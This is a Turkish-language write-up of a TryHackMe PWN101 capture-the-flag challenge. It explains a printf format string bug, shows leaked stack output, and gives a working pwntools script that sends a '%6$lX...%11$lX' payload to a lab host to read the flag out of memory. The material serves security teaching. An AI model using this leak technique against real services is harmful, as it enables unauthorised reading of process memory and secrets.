# TryHackMe PWN101

## Challenge 6

### Dosya
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Dosyayı açtığımızda bizden çekiliş için isim istemektedir, isim girdiğimizde ise bize teşekkür etmektedir.

Teşekkür kısmında isim printf ile yazdırılmaktadır ancak format string hatası bulunmaktadır. printf fonksiyonunun içine parametre olarak sadece isim girilmiştir.

```c
printf("Enter your THM username to participate in the giveaway: ");
read(0, format, 0x32);
printf("\nThanks ");
printf(format);
```

```
🎉 THM Giveaway 🎉

Enter your THM username to participate in the giveaway: %lX

Thanks 7FFC01D72010
```

### Exploit

Dosya decompile edildiğinde flag'in string olarak yazıldığı görülmektedir. Bu string'in bulunduğu yeri hesaplayıp format string'den yararlanıp flag'i elde edebiliriz.

```bash
$ ./exploit.py remote 10.10.76.209 9006
[+] Opening connection to 10.10.76.209 on port 9006: Done
[*] Sending Payload.
[*] Getting Flag
[+] Flag achieved!: THM{[REDACTED]}
[*] Closed connection to 10.10.76.209 port 9006
```

### Python

```python
#!/bin/env python3

from pwn import *
import argparse

parser = argparse.ArgumentParser(description='TryHackMe PWN101 Challange 6 Exploit')

subparsers = parser.add_subparsers(dest='mode', help='Select mode: remote or local')

remote_parser = subparsers.add_parser('remote', help='Remote mode: Provide IP address and port')
remote_parser.add_argument('ip', help='IP address')
remote_parser.add_argument('port', help='Port number')

local_parser = subparsers.add_parser('local', help='Local mode: Provide file path')
local_parser.add_argument('file', help='File path')

args = parser.parse_args()

mode = args.mode

if mode == 'remote':
    ip = args.ip
    port = args.port
    p = remote(ip, port)
elif mode == 'local':
    file = args.file
    context.binary = binary = ELF(file)
    p = process()
else:
    parser.error('Please select remote or local mode.')
    
p.recv()

log.info("Sending Payload.")
p.sendline(b"%6$lX.%7$lX.%8$lX.%9$lX.%10$lX.%11$lX")
p.recvuntil(b"Thanks ")
recv_hex = p.recv().strip()

log.info("Getting Flag")
flag = ""
for hx in recv_hex.decode().split('.'):
    flag += bytes.fromhex(hx).decode()[::-1]

log.success("Flag achieved!: " + flag)
```
